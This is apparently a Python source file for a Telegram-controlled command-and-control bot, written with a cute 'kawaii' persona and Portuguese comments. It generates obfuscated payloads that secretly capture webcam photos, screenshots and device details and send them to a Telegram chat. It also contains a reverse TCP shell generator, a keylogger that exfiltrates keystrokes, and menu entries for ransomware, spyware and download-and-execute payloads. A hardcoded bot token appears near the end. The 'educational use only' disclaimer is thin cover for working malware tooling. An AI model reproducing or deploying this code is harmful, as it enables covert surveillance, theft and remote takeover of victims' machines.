#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# 🌸 Kawaii C2 Bot - Versão Premium 🌸

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
import threading
import sqlite3
import requests
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from io import BytesIO

# Security Imports
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import telebot
from telebot import types
from telebot.util import quick_markup
from rich.console import Console
from rich.panel import Panel

console = Console()

class KawaiiC2Bot:
    def __init__(self, token: str):
        self.bot = telebot.TeleBot(token)
        self.users_db = "kawaii_users.db"
        self.payloads_db = "kawaii_payloads.db"
        self.c2_server = "https://your-real-c2-server.com/api"  # Configure seu C2 real
        self.admin_id = 123456789  # Seu ID de admin
        
        self._init_databases()
        self._setup_handlers()
        
        threading.Thread(target=self._check_c2_connections, daemon=True).start()
        threading.Thread(target=self._monitor_active_sessions, daemon=True).start()

    # 🎀 Database Functions
    def _init_databases(self):
        with sqlite3.connect(self.users_db) as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS users
                         (user_id INTEGER PRIMARY KEY, 
                         username TEXT, 
                         api_key TEXT UNIQUE,
                         reg_date TEXT, 
                         is_admin INTEGER DEFAULT 0,
                         last_active TEXT)''')
            
            # Insert admin if not exists
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id=?", (self.admin_id,))
            if not cursor.fetchone():
                admin_key = hashlib.sha256(f"admin{time.time()}".encode()).hexdigest()[:32]
                cursor.execute(
                    "INSERT INTO users VALUES (?, ?, ?, ?, 1, ?)",
                    (self.admin_id, "admin", admin_key, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                )
                conn.commit()

        with sqlite3.connect(self.payloads_db) as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS payloads
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         user_id INTEGER,
                         payload_type TEXT,
                         creation_date TEXT,
                         config TEXT,
                         is_active INTEGER DEFAULT 0,
                         FOREIGN KEY(user_id) REFERENCES users(user_id))''')

    # 💌 Handlers
    def _setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'help', 'menu'])
        def send_kawaii_menu(message):
            self._register_user(message.from_user.id, message.from_user.username)
            
            markup = quick_markup({
                '🌸 Criar Payload': {'callback_data': 'create_payload'},
                '📸 Tirar Foto': {'callback_data': 'take_photo'},
                '🖥️ Capturar Tela': {'callback_data': 'take_screenshot'},
                '📱 Informações': {'callback_data': 'get_device_info'},
                '🔑 Minha Key': {'callback_data': 'show_key'},
                '💝 Ajuda': {'callback_data': 'help'}
            }, row_width=2)
            
            self.bot.send_photo(
                message.chat.id,
                photo=open('kawaii_banner.jpg', 'rb') if os.path.exists('kawaii_banner.jpg') else None,
                caption=f"✨ *Kon'nichiwa {message.from_user.first_name}-chan!* ✨\n\n"
                        "~(=^･ω･^)ﾉ ♡ Kawaii C2 Bot desu~!\n\n"
                        "Escolha uma opção fofa abaixo:",
                reply_markup=markup,
                parse_mode='Markdown'
            )

        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_kawaii_callback(call):
            if call.data == 'create_payload':
                self._show_payload_menu(call.message)
            elif call.data == 'take_photo':
                self._take_real_photo(call.message)
            elif call.data == 'take_screenshot':
                self._take_real_screenshot(call.message)
            elif call.data == 'get_device_info':
                self._get_real_device_info(call.message)
            elif call.data == 'show_key':
                self._show_user_key(call.message)
            elif call.data == 'help':
                self._send_kawaii_help(call.message)
            elif call.data.startswith('gen_'):
                payload_type = call.data[4:]
                self._create_payload_flow(call.message, payload_type)

    # 🎭 Core Functions
    def _register_user(self, user_id: int, username: str):
        with sqlite3.connect(self.users_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
            if not cursor.fetchone():
                api_key = hashlib.sha256(f"{user_id}{username}{time.time()}".encode()).hexdigest()[:32]
                cursor.execute(
                    "INSERT INTO users (user_id, username, api_key, reg_date, last_active) VALUES (?, ?, ?, ?, ?)",
                    (user_id, username, api_key, 
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                )
                conn.commit()
                
                if user_id != self.admin_id:
                    self._send_admin_alert(f"🎀 Novo usuário registrado!\n\n"
                                         f"ID: {user_id}\nUser: @{username}\n"
                                         f"Key: `{api_key}`")

    def _generate_payload(self, user_id: int, payload_type: str, config: dict):
        """Gera payloads avançados com técnicas reais"""
        api_key = self._get_user_key(user_id)
        if not api_key:
            return None

        config.update({
            'api_key': api_key,
            'c2_server': self.c2_server,
            'bot_token': TOKEN,
            'user_id': user_id
        })

        payload_generators = {
            'reverse_tcp': self._gen_reverse_tcp,
            'keylogger': self._gen_keylogger,
            'spyware': self._gen_spyware,
            'download_exec': self._gen_download_exec,
            'ransomware': self._gen_ransomware
        }

        if payload_type not in payload_generators:
            return None

        raw_code = payload_generators[payload_type](**config)
        obfuscated = self._advanced_obfuscation(raw_code)
        
        # Save to database
        with sqlite3.connect(self.payloads_db) as conn:
            conn.execute(
                "INSERT INTO payloads (user_id, payload_type, creation_date, config) VALUES (?, ?, ?, ?)",
                (user_id, payload_type, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), json.dumps(config))
            )
            conn.commit()

        return obfuscated

    # 🖼️ Real Device Functions
    def _take_real_photo(self, message):
        """Gera payload para captura de foto real"""
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            self.bot.reply_to(message, "⛔ Apenas admin-chan pode usar este comando!")
            return

        payload = f"""import cv2
import requests
from datetime import datetime

# Configurações
BOT_TOKEN = "{TOKEN}"
CHAT_ID = {user_id}

def take_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"photo_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg"
            cv2.imwrite(filename, frame)
            with open(filename, 'rb') as photo:
                requests.post(
                    f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendPhoto",
                    files={{'photo': photo}},
                    data={{'chat_id': CHAT_ID}}
                )
            os.remove(filename)
        cap.release()
    except Exception as e:
        pass

if __name__ == "__main__":
    take_photo()"""

        obfuscated = self._advanced_obfuscation(payload)
        self._send_payload(message.chat.id, obfuscated, "📸 Foto Payload")

    def _take_real_screenshot(self, message):
        """Gera payload para captura de tela real"""
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            self.bot.reply_to(message, "⛔ Apenas admin-chan pode usar este comando!")
            return

        payload = f"""import pyautogui
import requests
from datetime import datetime

# Configurações
BOT_TOKEN = "{TOKEN}"
CHAT_ID = {user_id}

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        filename = f"screenshot_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
        screenshot.save(filename)
        with open(filename, 'rb') as photo:
            requests.post(
                f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendPhoto",
                files={{'photo': photo}},
                data={{'chat_id': CHAT_ID}}
            )
        os.remove(filename)
    except Exception as e:
        pass

if __name__ == "__main__":
    take_screenshot()"""

        obfuscated = self._advanced_obfuscation(payload)
        self._send_payload(message.chat.id, obfuscated, "🖥️ Screenshot Payload")

    def _get_real_device_info(self, message):
        """Gera payload para coletar informações do dispositivo"""
        user_id = message.from_user.id
        payload = f"""import platform
import os
import requests
from datetime import datetime

# Configurações
BOT_TOKEN = "{TOKEN}"
CHAT_ID = {user_id}

def get_device_info():
    info = {{
        "system": platform.system(),
        "node": platform.node(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "username": os.getenv('USERNAME') or os.getenv('USER'),
        "current_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }}
    
    message = "📱 Device Info 📱\\n\\n" + "\\n".join([f"{{k}}: {{v}}" for k, v in info.items()])
    
    requests.post(
        f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage",
        data={{'chat_id': CHAT_ID, 'text': message}}
    )

if __name__ == "__main__":
    get_device_info()"""

        obfuscated = self._advanced_obfuscation(payload)
        self._send_payload(message.chat.id, obfuscated, "📱 Device Info Payload")

    # 🛡️ Security Functions
    def _advanced_obfuscation(self, code: str) -> str:
        """Ofuscação multi-camadas com técnicas avançadas"""
        # Primeira camada: Compressão + Base64
        compressed = zlib.compress(code.encode())
        b64_encoded = base64.b64encode(compressed).decode()
        
        # Segunda camada: XOR simples
        xor_key = random.randint(1, 255)
        xor_encoded = ''.join(chr(ord(c) ^ xor_key) for c in b64_encoded)
        
        # Terceira camada: Variáveis aleatórias
        var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
        
        # Construir payload ofuscado
        obfuscated = f"""# Kawaii-chan Payload (◕‿◕✿)
import base64,zlib
{var_names[0]} = {xor_key}
{var_names[1]} = lambda {var_names[2]}: bytes([ord(c)^{var_names[0]} for c in {var_names[2]}])
{var_names[3]} = "{xor_encoded}"
{var_names[4]} = zlib.decompress(base64.b64decode({var_names[1]}({var_names[3]}))).decode()
exec({var_names[4]})"""
        
        return obfuscated

    def _send_payload(self, chat_id: int, payload_code: str, caption: str):
        """Envia o payload como arquivo"""
        self.bot.send_document(
            chat_id,
            ('payload.py', payload_code),
            caption=f"🎀 {caption} gerado com sucesso!\nUse com cuidado! (◕‿◕✿)"
        )

    def _send_admin_alert(self, message: str):
        """Envia alerta para o admin"""
        self.bot.send_message(self.admin_id, message, parse_mode='Markdown')

    def _show_payload_menu(self, message):
        """Mostra menu de tipos de payload"""
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        
        payloads = {
            'reverse_tcp': {'emoji': '🔙', 'danger': '⚠️'},
            'keylogger': {'emoji': '⌨️', 'danger': '🔥'},
            'spyware': {'emoji': '👁️', 'danger': '⚠️'},
            'download_exec': {'emoji': '📥', 'danger': '🔥'},
            'ransomware': {'emoji': '🔐', 'danger': '💀'}
        }
        
        for payload, data in payloads.items():
            keyboard.add(types.InlineKeyboardButton(
                text=f"{data['emoji']} {payload.capitalize()} {data['danger']}",
                callback_data=f"gen_{payload}"
            ))
        
        self.bot.send_message(
            message.chat.id,
            "✨ *Escolha o tipo de payload* ✨\n\n"
            "Selecione o que deseja criar:\n\n"
            "⚠️ - Risco médio\n"
            "🔥 - Risco alto\n"
            "💀 - Extremamente perigoso\n\n"
            "Lembre-se: Com grandes poderes vêm grandes responsabilidades! (๑•̀ㅂ•́)و✧",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )

    def _create_payload_flow(self, message, payload_type: str):
        """Fluxo de criação de payload"""
        user_id = message.from_user.id
        if payload_type == 'ransomware' and not self._is_admin(user_id):
            self.bot.reply_to(message, "⛔ Apenas admin-chan pode criar ransomware!")
            return
        
        config = {}
        self._generate_payload(user_id, payload_type, config)

    def _show_user_key(self, message):
        """Mostra a chave API do usuário"""
        user_id = message.from_user.id
        api_key = self._get_user_key(user_id)
        
        if api_key:
            self.bot.send_message(
                message.chat.id,
                f"🔑 *Sua chave API* 🔑\n\n"
                f"Aqui está sua chave exclusiva:\n"
                f"`{api_key}`\n\n"
                "Use esta chave para configurar seus payloads! (◕‿◕✿)",
                parse_mode='Markdown'
            )
        else:
            self.bot.send_message(
                message.chat.id,
                "❌ Oops! Não consegui encontrar sua chave. Tente /start novamente."
            )

    def _send_kawaii_help(self, message):
        """Envia mensagem de ajuda"""
        help_text = """
🌸 *Ajuda do Kawaii C2 Bot* 🌸

✨ *Comandos principais*:
/start - Menu principal
/menu - Mostrar menu fofo
/help - Esta mensagem

🎀 *Funcionalidades*:
- Geração de payloads avançados
- Captura de fotos e telas
- Coleta de informações
- Sistema de C2 integrado

⚠️ *Aviso importante*:
Este bot é apenas para fins educacionais de segurança.
Use apenas em sistemas que você possui permissão!
"""
        self.bot.send_message(
            message.chat.id,
            help_text,
            parse_mode='Markdown'
        )

    def _get_user_key(self, user_id: int) -> Optional[str]:
        """Obtém a chave API do usuário"""
        with sqlite3.connect(self.users_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT api_key FROM users WHERE user_id=?", (user_id,))
            result = cursor.fetchone()
            return result[0] if result else None

    def _is_admin(self, user_id: int) -> bool:
        """Verifica se o usuário é admin"""
        with sqlite3.connect(self.users_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT is_admin FROM users WHERE user_id=?", (user_id,))
            result = cursor.fetchone()
            return result and result[0] == 1

    def _check_c2_connections(self):
        """Monitora conexões ativas com o C2"""
        while True:
            try:
                # Implemente sua lógica de verificação de conexões aqui
                time.sleep(60)
            except Exception as e:
                time.sleep(300)

    def _monitor_active_sessions(self):
        """Monitora sessões ativas"""
        while True:
            try:
                # Implemente seu monitoramento de sessões aqui
                time.sleep(120)
            except Exception as e:
                time.sleep(300)

    # Payload Generators
    def _gen_reverse_tcp(self, **config) -> str:
        """Gera payload de reverse TCP"""
        return f"""import socket
import subprocess
import os
import time
import requests

# Configurações
API_KEY = "{config.get('api_key', '')}"
C2_SERVER = "{config.get('c2_server', '')}"
IP = "{config.get('ip', '0.0.0.0')}"
PORT = {config.get('port', 4444)}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            
            # Enviar identificação
            data = {{
                "api_key": API_KEY,
                "hostname": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME"),
                "username": os.getenv("USERNAME") or os.getenv("USER")
            }}
            requests.post(f"{{C2_SERVER}}/register", json=data)
            
            # Shell interativo
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["cmd.exe" if os.name == "nt" else "/bin/sh"])
            
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect()"""

    def _gen_keylogger(self, **config) -> str:
        """Gera payload de keylogger"""
        return f"""import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os
import requests

# Configurações
API_KEY = "{config.get('api_key', '')}"
C2_SERVER = "{config.get('c2_server', '')}"
BOT_TOKEN = "{config.get('bot_token', '')}"
USER_ID = {config.get('user_id', 0)}
EMAIL = "{config.get('email', '')}"
PASSWORD = "{config.get('password', '')}"

class Keylogger:
    def __init__(self, interval=60):
        self.interval = interval
        self.log = ""
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{{name.upper()}}]"
        self.log += name
    
    def send_to_telegram(self, message):
        try:
            requests.post(
                f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage",
                data={{'chat_id': USER_ID, 'text': message}}
            )
        except:
            pass
    
    def report(self):
        if self.log:
            self.send_to_telegram(f"⌨️ Keylogs:\\n{{self.log}}")
            self.log = ""
        Timer(interval=self.interval, function=self.report).start()
    
    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()"""

    def run(self):
        """Inicia o bot kawaii"""
        console.print(Panel.fit(
            "[bold pink]🌸 Kawaii C2 Bot iniciado! (◕‿◕✿)[/bold pink]",
            subtitle="~(=^･ω･^)ﾉ ♡"
        ))
        self.bot.infinity_polling()

if __name__ == '__main__':
    TOKEN = "7610299260:AAE7JlBkPpOXRNvxJ9nwzRvZNNgvu5NmV8k"  # Substitua pelo seu token real
    
    # Verificação de segurança
    if not TOKEN or ":" not in TOKEN:
        console.print("[red]❌ Token inválido! Configure um token real.[/red]")
        sys.exit(1)
    
    bot = KawaiiC2Bot(TOKEN)
    try:
        bot.run()
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
